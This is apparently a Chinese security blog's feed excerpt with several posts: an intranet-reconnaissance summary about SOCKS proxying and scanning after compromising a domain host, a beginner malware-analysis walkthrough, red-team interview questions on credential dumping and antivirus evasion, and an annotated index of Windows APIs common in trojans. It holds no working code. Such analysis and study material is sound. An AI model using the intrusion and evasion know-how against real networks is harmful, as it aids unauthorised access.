<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>核心就是在拿下一台域内主机后，开socks代理，主要目的是为了规避杀软，同样的可以使用 nmap、fscan、nbtscan 等端口扫描工具来进行信息收集，结合一下，根据域内成员结构、端口开放服务、各个网段等各种突破口 制定详细的进攻计划。</p>
<p>Peace</p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>CE的第一次使用</title>
    <url>/2021/08/27/%E5%A4%96%E6%8C%82%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>属实无聊，玩玩CE</p>
<p><img src="/2021/08/27/%E5%A4%96%E6%8C%82%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p>
<p><img src="/2021/08/27/%E5%A4%96%E6%8C%82%E5%AD%A6%E4%B9%A0/2.png" alt="2"></p>
<p><img src="/2021/08/27/%E5%A4%96%E6%8C%82%E5%AD%A6%E4%B9%A0/3.png" alt="3"></p>
<p><img src="/2021/08/27/%E5%A4%96%E6%8C%82%E5%AD%A6%E4%B9%A0/4.png" alt="4"></p>
<p><img src="/2021/08/27/%E5%A4%96%E6%8C%82%E5%AD%A6%E4%B9%A0/5.png" alt="5"></p>
<p><img src="/2021/08/27/%E5%A4%96%E6%8C%82%E5%AD%A6%E4%B9%A0/6.png" alt="6"></p>
<p><img src="/2021/08/27/%E5%A4%96%E6%8C%82%E5%AD%A6%E4%B9%A0/7.png" alt="7"></p>
<p><img src="/2021/08/27/%E5%A4%96%E6%8C%82%E5%AD%A6%E4%B9%A0/8.png" alt="8"></p>
<p><img src="/2021/08/27/%E5%A4%96%E6%8C%82%E5%AD%A6%E4%B9%A0/9.png" alt="9"></p>
<p><img src="/2021/08/27/%E5%A4%96%E6%8C%82%E5%AD%A6%E4%B9%A0/10.png" alt="10"></p>
<p><img src="/2021/08/27/%E5%A4%96%E6%8C%82%E5%AD%A6%E4%B9%A0/11.png" alt="11"></p>
<img src="/2021/08/27/%E5%A4%96%E6%8C%82%E5%AD%A6%E4%B9%A0/12.png" alt="12" style="zoom:80%;">



<p>草草记录下。</p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>水文</category>
      </categories>
      <tags>
        <tag>外挂</tag>
      </tags>
  </entry>
  <entry>
    <title>恶意样本分析初探</title>
    <url>/2021/10/25/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>首先静态分析该exe文件，看下导入函数，其中一个调用了 <code>WININET.dll</code>中的 <code>InternetGetConnectedState</code> 函数，这个跟其他调用 <code>kernel32.dll</code> 中的函数相比，显得有些特殊。</p>
<p><img src="/2021/10/25/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/image-20211023170231536.png" alt="image-20211023170231536"></p>
<p>查阅文档可知，这是一个 判断本地网络连接状态的函数，连接成功返回1，连接失败返回0</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetgetconnectedstate">互联网连接状态功能 （wininet.h） - win32 应用程序|微软文档 (microsoft.com)</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InternetGetConnectedState</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] LPDWORD lpdwFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD   dwReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>



<p>找到了main 函数，就从这里开始分析</p>
<p><code>main</code>函数位于<code>401040</code>，调用了<code>401000</code>处的函数</p>
<p><img src="/2021/10/25/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/image-20211024100414924.png" alt="image-20211024100414924"></p>
<p>跳过去看看    </p>
<p>上面一大堆没用的是编译器生成的，不要陷入其中</p>
<p>看到该区段的权限是 可读/可执行，并且调用了 <code>InternetGetConnectedState</code> 函数</p>
<p><img src="/2021/10/25/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/image-20211024095211845.png" alt="image-20211024095211845"></p>
<p>不看流程图的话大概也可以看出这是一个 if 语句的汇编代码，<code>cmp [ebp+var_4] ，0</code> ，根据结果跳转到不同的分支</p>
<p><img src="/2021/10/25/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/image-20211024100555118.png" alt="image-20211024100555118"></p>
<p>在 <code>View-&gt;Graphs-&gt;Flow chart</code>可以查看流程图，相比较于空格的 流程图，更简洁明了</p>
<p>这里使用cmp指令对保存了返回结果的eax寄存器与0比较，然后使用 jz 指令控制执行流。上面我们提到，当 建立网络连接时，<code>InternetGetConnectedState </code>函数返回1，否则返回0. 如果结果是1，0标志位（ZF）会被清除，jz跳转到1所在的<code>false</code>分支，否则跳转到<code>true</code>分支</p>
<p><img src="/2021/10/25/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/image-20211024100839298.png"></p>
<p>下面分析这个位于 <code>40105f</code>处的子过程</p>
<p><img src="/2021/10/25/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/image-20211024103413308.png" alt="image-20211024103413308"></p>
<p><img src="/2021/10/25/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/image-20211024102412365.png" alt="image-20211024102412365"></p>
<p>其实这里是<code> printf</code> 函数，但是我们并没有看到一些printf函数的特征，这就需要去找一些其他的特征来证明这里是<code>printf</code>函数</p>
<p>在调用这个函数之前，都向栈中<code>push</code>了 一串 格式化字符串，并且结尾是<code> \n</code> 换行符，因此可以推出这里调用的函数就是 <code>printf</code></p>
<p>上面都是是根据静态分析得出的结论，真正的结果还是要实践检验一下</p>
<p><img src="/2021/10/25/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/image-20211024104729701.png" alt="image-20211024104729701"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个恶意代码的主要功能就是检查是否存在 <code>Internet</code>连接，存在输出1，否则输出0。</p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>木马分析</category>
      </categories>
      <tags>
        <tag>后门</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>最近的一些总结及未来的计划</title>
    <url>/2021/10/10/%E6%9C%80%E8%BF%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%E5%8F%8A%E6%9C%AA%E6%9D%A5%E7%9A%84%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<p>今天也是刚注册公众号，想着记录下日常，随便总结下吧。</p>
<span id="more"></span>

<p>好久好久没有做过总结了，本来想着应该是年底总结下，这里小小的总结下近况。</p>
<h4 id="0x00-眺望过去"><a href="#0x00-眺望过去" class="headerlink" title="0x00 眺望过去"></a>0x00 眺望过去</h4><p>刚拿到某大厂的实习offer，后天准备去实习。回想起最近一个月的时间，心都没有静下来过，本来只是抱着试一试的心态投了简历，可也没想到会突然接到面试电话，有点猝不及防，扰乱了我本该平静的心。后面就忙着准备面试，怀着等待offer的激动心情，手机一整天没有静音过，生怕错过面试消息，以前没人找的时候都是24小时免打扰的。就这样，算上国庆假期，等了一个月终于等来了offer，然后就是确定实习时间，考虑到另一个城市的生活，租房等等，自己也算提早体验到了刚毕业进入职场的状态。</p>
<p>这个月的状态是挺浮躁的，很多时候无法静心下来研究东西，和前几个月的状态有了很大的变化。以前一天到晚就是安全安全安全，所有的时间都给了安全，想起了暑假午夜离开公司哈哈哈，那段时间真的脑子里面只想着提高技术。很感谢暑假实习公司的各位大佬对我的帮助~ 让我成长了很多~</p>
<p>这是凌晨12点的公司</p>
<img src="/2021/10/10/%E6%9C%80%E8%BF%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%E5%8F%8A%E6%9C%AA%E6%9D%A5%E7%9A%84%E8%AE%A1%E5%88%92/image-20211010020019834.png" alt="image-20211010020019834" style="zoom:67%;">

<img src="/2021/10/10/%E6%9C%80%E8%BF%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%E5%8F%8A%E6%9C%AA%E6%9D%A5%E7%9A%84%E8%AE%A1%E5%88%92/image-20211010015928407.png" alt="image-20211010015928407" style="zoom:67%;">

<p>而这个月的状态明显不同。学校的事情太多？一个人没有学习的氛围了？贪玩了？emmm  可能都有吧。确实陷入了一种舒适圈，但看着身边一个个师傅都好厉害，自己这么菜，凭啥呆在舒适圈啊？</p>
<p>但是现实生活中没人能陪我一起学习啊，所以就很容易自满，止步不前。刚开始只在博客写点东西，现在想着也在公众号上发一发吧，算是另一种方式监督自己，而不至于每天懈怠。现在想着还有好多东西要去学习：Windows底层原理、免杀研究、二进制……还想着学开发写一点有意思的工具……   菜死了，有啥理由不学啊</p>
<p>但是安全并不是生活的全部啊。这浮躁的一个月，也捡起了很多旧东西：看电影呀、音乐呀、旅游……似乎还激发了新爱好：摄影和剪视频 哈哈哈哈。喜欢上了这种记录生活的感觉，慢下来的生活，也很舒服。也很期待以后的生活能多姿多彩。</p>
<h4 id="0x01-展望未来"><a href="#0x01-展望未来" class="headerlink" title="0x01 展望未来"></a>0x01 展望未来</h4><p>后面实习的两个月，文章不晓得还能不能更新，随缘吧。</p>
<p>学习是一定要学习的，我找不到任何理由不坚持持续学习。但学习的方向应该不会像以前一样局限于安全了。去年买的小说，还没有拆封；当初每周看一部电影的flag，是从什么时候倒下的；想要学的投资，还没新建文件夹…… 当然安全仍是我要去持续学习并且主要学习的内容。</p>
<p>所以创建博客和公众号都是为了监督自己，慢慢强迫自己写出一些高质量的文章吧。</p>
<p>公众号：<strong>橙子的小城</strong></p>
<p>很期待进入公司后的实习生活，希望可以慢慢成长为自己理想的模样~</p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>个人总结</category>
      </categories>
      <tags>
        <tag>闲聊</tag>
      </tags>
  </entry>
  <entry>
    <title>某信实验室渗透岗校招面试</title>
    <url>/2021/09/23/%E5%A5%87%E5%AE%89%E4%BF%A1%E6%B8%97%E9%80%8F%E5%B2%97%E6%A0%A1%E6%8B%9B%E9%9D%A2%E8%AF%95/</url>
    <content><![CDATA[<p>岗位是黑灰产研究，和实习经历蛮匹配。</p>
<h3 id="9-23电话一面"><a href="#9-23电话一面" class="headerlink" title="9.23电话一面"></a>9.23电话一面</h3><p>面试时长：16分钟</p>
<ul>
<li>经典的自我介绍</li>
<li>讲讲实习的时候打过的目标</li>
<li>讲一下什么是文件包含</li>
<li>redis未授权利用讲一下</li>
<li>有钓鱼经验吗，举个例子</li>
<li>有社工溯源经历吗，讲讲你理解的社工</li>
<li>一台服务器getshell后你会干什么</li>
<li>dumphash有利用过吗，讲一下，讲几种dumphash的方法</li>
<li>病毒远控的免杀有多少了解</li>
<li>你改免杀的时候一般会改哪些地方</li>
<li>杀软经常查杀的敏感函数有哪些</li>
<li>讲一下你做过的免杀</li>
<li>内网渗透的思路</li>
<li>有挖过一些漏洞吗，讲一下你挖的那几个漏洞</li>
<li>有什么想问我的吗</li>
</ul>
<p>面了这么多场，麻木了……  总的来说还是很常规，问的也都是偏红队的一些技能点。</p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>木马常用dll/api函数</title>
    <url>/2021/12/19/%E6%9C%A8%E9%A9%AC%E5%B8%B8%E7%94%A8dllapi%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>微软提供了很多dll，被木马经常使用的也有很多，没有必要全部记下来，碰到了去查 msdn 就好了，但是有时候官方文档机翻过比较晦涩难懂，所以本文主要列举了常用的dll/api 以及对应的功能，希望对大家有所帮助，就当一篇索引吧。</p>
<h2 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h2><h3 id="Kernel32-dll"><a href="#Kernel32-dll" class="headerlink" title="Kernel32.dll"></a>Kernel32.dll</h3><p>Kernel32.dll 包括 Windows操作系统最基本的功能，比如文件系统、设备访问、进程、线程、内存、错误处理等。这些功能基本上是所有操作系统都提供的功能。</p>
<p>以下内容来自百度百科</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kernel32.dll是Windows 9x/Me中非常重要的32位动态链接库文件，属于内核级文件。它控制着系统的内存管理、数据的输入输出操作和中断处理，当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。</span><br></pre></td></tr></table></figure>

<p>这是百度的说法，其实是有问题的，Kernel32.dll 并不是内核层的dll，而是属于用户层。Kernel32.dll 属于子系统dll，作用就是提供一个进入内核层的接口。</p>
<p>接口就是，ssdt表，把ring3的Win32 API和ring0的内核API联系起来。SSDT并不仅仅只包含一个庞大的地址索引表，它还包含着一些其它有用的信息，诸如地址索引的基地址、服务函数个数等。</p>
<p>ssdt通过修改此表的函数地址可以对常用windows函数进行hook，从而实现对一些核心的系统动作进行过滤、监控的目的。一些HIPS、防毒软件、系统监控、注册表监控软件往往会采用此接口来实现自己的监控模块。</p>
<p><img src="/2021/12/19/%E6%9C%A8%E9%A9%AC%E5%B8%B8%E7%94%A8dllapi%E5%87%BD%E6%95%B0/image-20211201011746162.png" alt="image-20211201011746162"></p>
<p><img src="/2021/12/19/%E6%9C%A8%E9%A9%AC%E5%B8%B8%E7%94%A8dllapi%E5%87%BD%E6%95%B0/image-20211201094859848.png" alt="image-20211201094859848"></p>
<h3 id="WS2-32-dll"><a href="#WS2-32-dll" class="headerlink" title="WS2_32.dll"></a>WS2_32.dll</h3><p>ws2_32.dll是<strong>Windows Sockets应用程序接口</strong>， 用于支持Internet和网络应用程序。它提供网络相关服务，包括 Winsock、NetDDE、RPC、Netbios。</p>
<h3 id="Wininet-dll"><a href="#Wininet-dll" class="headerlink" title="Wininet.dll"></a>Wininet.dll</h3><p><a href="https://docs.microsoft.com/en-us/windows/win32/wininet/about-wininet">关于WinINet - Win32应用程序|微软文档 (microsoft.com)</a></p>
<p>Windows Internet （WinINet） 应用程序编程接口 （API） 使应用程序能够与 FTP 和 HTTP 协议交互以访问 Internet 资源</p>
<h3 id="Urlmon-dll"><a href="#Urlmon-dll" class="headerlink" title="Urlmon.dll"></a>Urlmon.dll</h3><p>urlmon.dll是计算机硬盘驱动器上的可执行文件。此文件包含机器代码。如果您在PC上启动软件OLE，则urlmon.dll中包含的命令将在您的PC上执行。为此，该文件将加载到主内存 （RAM） 中，并作为 Win32 进程的 OLE32 扩展（也称为任务）在那里运行。</p>
<h3 id="Advapi32-dll"><a href="#Advapi32-dll" class="headerlink" title="Advapi32.dll"></a>Advapi32.dll</h3><p>Advapi32.dll是一个与API服务库关联的动态链接库文件，提供对高级功能的访问。它具有Windows 内核提供的额外功能，包括注册表、系统关闭重启、Windows Service、用户账号管理。</p>
<h3 id="User32-dll"><a href="#User32-dll" class="headerlink" title="User32.dll"></a>User32.dll</h3><p>与Windows窗口交互相关的操作、鼠标键盘、基本控件如按钮、滚动条等。</p>
<h3 id="Ntdll-dll"><a href="#Ntdll-dll" class="headerlink" title="Ntdll.dll"></a>Ntdll.dll</h3><p>ntdll.dll是Windows系统从ring3到ring0的入口。位于Kernel32.dll和user32.dll中的所有win32 API 最终都是调用ntdll.dll中的函数实现的。ntdll.dll中的函数使用SYSENTRY进入ring0，函数的实现实体在ring0中。注意 <strong>ntdll.dll</strong>也是属于用户层，而不是内核层。</p>
<h3 id="Shell32-dll"><a href="#Shell32-dll" class="headerlink" title="Shell32.dll"></a>Shell32.dll</h3><p>主要进行与 Windows 图形shell相关的操作</p>
<h3 id="Rpccrt4-dll"><a href="#Rpccrt4-dll" class="headerlink" title="Rpccrt4.dll"></a>Rpccrt4.dll</h3><p>rpcrt4.dll是远程程序调用(RPC)应用程序接口API，用于WIndows应用程序对网络和Internet连接。</p>
<h3 id="Crypt32-dll"><a href="#Crypt32-dll" class="headerlink" title="Crypt32.dll"></a>Crypt32.dll</h3><p>Crypt32.dll是实现CryptoAPI中许多证书和加密消息传递功能的模块，例如<a href="https://docs.microsoft.com/en-us/windows/desktop/api/Wincrypt/nf-wincrypt-cryptsignmessage"><strong>CryptSignMessage</strong></a>。主要用来加密。</p>
<p>当然不止这些，有师傅遇到经常见到的dll可以告诉我，我再补充，</p>
<h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><h3 id="文件类"><a href="#文件类" class="headerlink" title="文件类"></a>文件类</h3><h4 id="CreateFile"><a href="#CreateFile" class="headerlink" title="CreateFile"></a>CreateFile</h4><p>顾名思义。创建一个新文件，或仅仅打开一个已有文件。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea">CreateFileA 函数 （fileapi.h） - Win32 应用|微软文档 (microsoft.com)</a></p>
<h4 id="CreateFileMapping"><a href="#CreateFileMapping" class="headerlink" title="CreateFileMapping"></a>CreateFileMapping</h4><p>创建一个映射到文件的句柄，将文件装载到内存，并使得它可以通过内存地址进行访问。启动器、装载器和注入器会使用这个函数来读取和修改PE文件。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga">CreateFileMappingA 函数 （winbase.h） - Win32 应用|微软文档 (microsoft.com)</a></p>
<h4 id="OpenFile"><a href="#OpenFile" class="headerlink" title="OpenFile"></a>OpenFile</h4><p>也是打开文件。和 Createfile 功能差不多，但感觉 create file用到的更多</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-openfile">OpenFile 函数 （winbase.h） - Win32 应用|微软文档 (microsoft.com)</a></p>
<h4 id="FindFirstFile-FindNextFile"><a href="#FindFirstFile-FindNextFile" class="headerlink" title="FindFirstFile/FindNextFile"></a>FindFirstFile/FindNextFile</h4><p>根据文件名查找文件/ 遍历文件时，判断当前目录是否有下一个文件。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfilea">FindFirstFileA function （fileapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="GetModuleFileName"><a href="#GetModuleFileName" class="headerlink" title="GetModuleFileName"></a>GetModuleFileName</h4><p>返回目前进程装载模块的文件的完整路径。恶意代码可以使用这个函数，在目前运行进程中修改或者复制文件。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea">GetModuleFileNameA function （libloaderapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="GetModuleHandle"><a href="#GetModuleHandle" class="headerlink" title="GetModuleHandle"></a>GetModuleHandle</h4><p>用来获取已装载模块句柄的函数，恶意代码可以使用GetModuleHandle在一个装载模块中定位和修改代码，或者搜索一个合适位置来注入代码。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea">GetModuleHandleA function （libloaderapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="GetProcAddress"><a href="#GetProcAddress" class="headerlink" title="GetProcAddress"></a>GetProcAddress</h4><p>获取装载到内存中一个DLL程序的函数地址。用来从其他DLL程序中导入函数，以补充在PE文件头部中导入的函数。</p>
<p><a href="https://docs.microsoft.com/zh-cn/cpp/build/getprocaddress?view=msvc-170">GetProcAddress | Microsoft Docs</a></p>
<h4 id="GetStartupInfo"><a href="#GetStartupInfo" class="headerlink" title="GetStartupInfo"></a>GetStartupInfo</h4><p>取得进程在启动时被指定的 STARTUPINFO 结构。这个结构包括当前进程如何自动配置运行配置信息，比如标准句柄指向哪些位置。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getstartupinfow">GetStartupInfoW function （processthreadsapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="GetTempPath"><a href="#GetTempPath" class="headerlink" title="GetTempPath"></a>GetTempPath</h4><p>获取为临时文件指定的路径，如果看到恶意代码使用了这个函数，需要检查他是否在临时文件路径中读取或写入了一些文件。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-gettemppatha">GetTempPathA 函数 （fileapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="GetWindowsDirectory"><a href="#GetWindowsDirectory" class="headerlink" title="GetWindowsDirectory"></a>GetWindowsDirectory</h4><p>获取Windows 目录的路径，恶意代码经常使用这个函数来确定将其他恶意程序安装到哪个目录</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya">GetWindowsDirectoryA function （sysinfoapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="MapViewOfFile"><a href="#MapViewOfFile" class="headerlink" title="MapViewOfFile"></a>MapViewOfFile</h4><p>将一个文件映射到内存，将文件内容变得通过内存地址可访问。启动器，装载器和注入器使用这个函数来读取和修改PE文件。通过使用此函数，恶意代码可以避免使用WriteFile来修改文件内容。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile">MapViewOfFile 函数 （memoryapi.h） - Win32 应用程序|微软文档 (microsoft.com)</a></p>
<h4 id="NtQueryDirectoryFile"><a href="#NtQueryDirectoryFile" class="headerlink" title="NtQueryDirectoryFile"></a>NtQueryDirectoryFile</h4><p>返回一个目录中文件的信息，内核套件普遍会hook这个函数来隐藏文件。</p>
<p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntquerydirectoryfile">NtQueryDirectoryFile function (ntifs.h) - Windows drivers | Microsoft Docs</a></p>
<h4 id="SetFileTime"><a href="#SetFileTime" class="headerlink" title="SetFileTime"></a>SetFileTime</h4><p>修改一个文件的创建，访问或者最后修改时间，恶意代码经常使用这个函数来隐藏恶意行为。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfiletime">SetFileTime function （fileapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="Wow64DisableWow64FsRedirection"><a href="#Wow64DisableWow64FsRedirection" class="headerlink" title="Wow64DisableWow64FsRedirection"></a>Wow64DisableWow64FsRedirection</h4><p>禁用32为文件在64位操作系统中装载后发生的文件重定向机制，如果一个32位应用程序在调用这个函数后向C:\Windows\System32写数据，那么它将会直接写到真正C:\Windows\System32，而不是被重定向至C:\Windows\SysWOW64</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/wow64apiset/nf-wow64apiset-wow64disablewow64fsredirection">Wow64DisableWow64FsRedirection function (wow64apiset.h) - Win32 apps | Microsoft Docs</a></p>
<h3 id="网络类"><a href="#网络类" class="headerlink" title="网络类"></a>网络类</h3><h4 id="accept"><a href="#accept" class="headerlink" title="accept"></a>accept</h4><p>用来监听入站网络连接，此函数预示着程序会在一个套接字上监听入站网络连接。</p>
<h4 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h4><p>用来将一个本地地址关联到套接字上，以监听入站网络连接</p>
<h4 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h4><p>用来连接一个远程套接字。恶意代码经常使用底层功能函数来连接一个命令控制服务器。</p>
<h4 id="InternetOpenA"><a href="#InternetOpenA" class="headerlink" title="InternetOpenA"></a>InternetOpenA</h4><p>初始化WinINet中的一些高层次互联网访问函数，比如InternetOpenUrl和InternetReadFile。搜索Internetopen函数是找到互联网访问功能初始位置的一个好方法。InternetOpen函数的-一个参数是User-Agent，有时也可以作为基于网络的特征码。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena">InternetOpenA function (wininet.h) - Win32 apps | Microsoft Docs</a></p>
<h4 id="CoCreateInstance"><a href="#CoCreateInstance" class="headerlink" title="CoCreateInstance"></a>CoCreateInstance</h4><p>创建一个COM对象，COM对象提供了非常多样化的功能。类标识（CLSID）会告诉你哪个文件包含着实现COM对象的代码。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance">CoCreateInstance function （combaseapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="FtpPutFile"><a href="#FtpPutFile" class="headerlink" title="FtpPutFile"></a>FtpPutFile</h4><p>将本地文件上传到FTP服务器</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-ftpputfilea">FtpPutFileA 函数 （wininet.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="GetAdaptersInfo"><a href="#GetAdaptersInfo" class="headerlink" title="GetAdaptersInfo"></a>GetAdaptersInfo</h4><p>用来获取系统上网络适配器的相关信息。后门程序有时会调用GetAdaptersInfo函数，来取得关于受感染主机的摘要信息。在某些情况下，这个函数也会被使用来取得主机的MAC地址，在对抗虚拟机技术中用来检测VMware等虚拟机。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getadaptersinfo">GetAdaptersInfo function （iphlpapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="gethostbyname"><a href="#gethostbyname" class="headerlink" title="gethostbyname"></a>gethostbyname</h4><p>返回对应于给定主机名的包含主机名字和地址信息的hostent结构指针，在向一个远程主机发起IP连接之前，用来对一个特定域名执行一次DNS查询，作为命令控制服务器的域名通常可以用来创建很好的网络监测特征码</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-gethostbyname">gethostbyname 函数 （winsock2.h） - Win32 应用|微软文档 (microsoft.com)</a></p>
<h4 id="gethostname"><a href="#gethostname" class="headerlink" title="gethostname"></a>gethostname</h4><p>获取计算机主机名。后门程序经常使用此函数来获取受害主机的摘要信息</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-gethostname">gethostname 函数 （winsock.h） - Win32 应用|微软文档 (microsoft.com)</a></p>
<h4 id="inet-addr"><a href="#inet-addr" class="headerlink" title="inet_addr"></a>inet_addr</h4><p>将一个IP地址字符串，如127.0.0.1，进行转化，使其能够在如connect等函数中使用。这些字符串有时也可以用作基于网络的特征码。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_addr">inet_addr函数 （winsock2.h） - Win32 应用|微软文档 (microsoft.com)</a></p>
<h4 id="InternetOpen"><a href="#InternetOpen" class="headerlink" title="InternetOpen"></a>InternetOpen</h4><p>初始化WinINet中的一些高层次互联网访问函数，搜索此函数是找到互联网访问功能初始位置的一个好方法。该函数的一个参数是User-Agent，有时也可以作为基于的特征码。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena">InternetOpenA 函数 （wininet.h） - Win32 应用程序|微软文档 (microsoft.com)</a></p>
<h4 id="InternetOpenUrl"><a href="#InternetOpenUrl" class="headerlink" title="InternetOpenUrl"></a>InternetOpenUrl</h4><p>使用FTP,HTTP或HTTPS协议连接来打开一个特定的URL，如果URL固定，则可以作为基于网络的特征码</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurla">InternetOpenUrlA 函数 （wininet.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="InternetReadFile"><a href="#InternetReadFile" class="headerlink" title="InternetReadFile"></a>InternetReadFile</h4><p>从一个由InternetOpenUrl,FtpOpenFile, 或HttpOpenRequest函数打开的句柄中读取数据</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile">InternetReadFile function （wininet.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="InternetWriteFile"><a href="#InternetWriteFile" class="headerlink" title="InternetWriteFile"></a>InternetWriteFile</h4><p>向服务器上传文件</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetwritefile">InternetWriteFile 函数 （wininet.h） - Win32 应用程序|微软文档 (microsoft.com)</a></p>
<h4 id="NetShareEnum"><a href="#NetShareEnum" class="headerlink" title="NetShareEnum"></a>NetShareEnum</h4><p>返回服务器上共享的资源的信息</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netshareenum">NetShareEnum function （lmshare.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="OleInitialize"><a href="#OleInitialize" class="headerlink" title="OleInitialize"></a>OleInitialize</h4><p>用来初始化COM库，使用COM对象的程序必须在调用任何其他COM功能之前，调用这个函数。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/ole2/nf-ole2-oleinitialize">OleInitialize function （ole2.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="recv"><a href="#recv" class="headerlink" title="recv"></a>recv</h4><p>从一个远程主机获取数据，恶意代码经常使用这个函数来从远程的命令控制服务器获取数据。</p>
<h4 id="send"><a href="#send" class="headerlink" title="send"></a>send</h4><p>发送数据到远程主机，恶意代码经常使用这个函数来发送数据到远程的命令控制服务器。</p>
